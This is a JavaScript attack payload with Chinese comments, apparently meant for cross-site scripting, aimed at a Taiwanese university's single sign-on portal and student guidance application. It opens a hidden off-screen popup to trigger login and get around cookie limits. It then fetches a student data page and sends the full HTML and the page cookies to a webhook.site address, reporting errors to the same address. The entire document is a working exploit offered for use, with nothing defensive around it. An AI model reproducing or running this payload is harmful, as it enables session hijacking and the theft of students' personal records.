(async () => {
    const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
    
    // SSO 入口 (觸發登入)
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
    // 目標資料頁
    const targetUrl = "/GuidanceApp/StdtLoginCtrl?PageType=1B"; 

    try {
        // 1. 彈窗觸發 SSO (繞過第三方 Cookie 限制)
        const popup = window.open(ssoUrl, "sso_popup", "width=100,height=100,left=-1000,top=-1000");

        if (!popup) {
            fetch(webhook + "?error=Popup_Blocked");
            return;
        }

        // 2. 等待登入完成 (6秒)
        await new Promise(r => setTimeout(r, 6000));

        // 3. 關閉彈窗
        try { popup.close(); } catch(e) {}

        // 4. 抓取完整資料
        const response = await fetch(targetUrl);
        const fullHtml = await response.text();

        // 5. 發送完整 HTML (使用 POST)
        fetch(webhook, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json' // 雖然 no-cors 不會送 header，但為了語意加上
            },
            body: JSON.stringify({
                msg: "FULL_DUMP_SUCCESS",
                target_url: targetUrl,
                status: response.status,
                // 這裡就是你要的完整 HTML
                full_html_source: fullHtml,
                cookies: document.cookie
            })
        });

    } catch (e) {
        fetch(webhook + "?error=" + encodeURIComponent(e.message));
    }
})();